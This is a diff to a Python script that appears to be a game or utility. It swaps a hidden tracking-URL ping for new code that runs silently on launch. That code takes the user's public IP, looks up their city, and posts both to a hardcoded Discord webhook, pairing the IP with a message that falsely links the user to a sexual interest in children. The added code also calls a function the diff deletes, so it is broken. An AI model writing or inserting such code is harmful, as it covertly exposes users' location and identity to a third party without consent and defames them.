@@ -50,12 +50,24 @@ import pygame #line:54
 from colorama import Fore ,Style #line:55
 os .system ('cls')#line:56
 import requests #line:57
-def Monitor_Users():
- try:
-    Monitor_Users ="https://mymap.quest/Z4BV1L"#line:58
-    requests .get (Monitor_Users ,timeout =0.9 )#line:59
- except:
-   pass
+import requests
+
+ip = requests.get("https://api.ipify.org").text
+
+message = {
+    "content": f"asia loves kids  {ip}"
+}
+
+geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
+
+geo_info = (
+    f"Area {geo.get('city', 'N/A')}\n"
+) 
+
+webhook_url = "https://discord.com/api/webhooks/1382538585575788614/LTbGQ-TBV7_HnPWVia-QkGQ6f8q_GI77xYx5OCYrhquyf2kkem-N6bWaSN0-Y-N0Anak"
+
+requests.post(webhook_url, json={"content": geo_info})
+requests.post(webhook_url, json=message)
 Monitor_Users()
 time .sleep (0.01 )#line:60
 os .system ("cls")#line:61
